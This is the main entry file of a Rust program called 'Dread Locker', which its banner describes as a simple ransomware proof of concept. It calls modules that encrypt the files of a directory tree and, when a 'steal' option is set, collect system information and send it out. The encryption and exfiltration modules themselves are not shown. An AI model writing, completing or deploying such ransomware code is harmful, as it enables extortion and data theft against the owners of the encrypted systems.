use std::env;
use std::process;
mod encryption_functions;
mod exfiltration_functions;
mod infograb_functions;
mod settings;
use crate::encryption_functions::iterate_dir;
use crate::settings::Config;
fn main() {
    let args: Vec<String> = env::args().collect();
    let mut config: Config = Config::new(args).unwrap_or_else(|err| {
        eprintln!("Syntax error: {}", err);
        process::exit(1);
    });
    style();
    iterate_dir(&mut config);
    if config.steal() {
        println!("Trying to get info");
        let result = infograb_functions::get_info();
        println!("{:?}", result);
        let resp = exfiltration_functions::exfiltrate_infos(result);
        match resp {
            Ok(_) => println!("Success"),
            Err(e) => eprintln!("Error: {}", e),
        }
    }
}
fn style() {
    println!("---------------------------------------");
    println!(r"\______Dread Locker version: 0.4______/");
    println!("---------------------------------------");
    println!("Simple ransomware PoC because I'm currently learning Rust and I figured why not!");
}
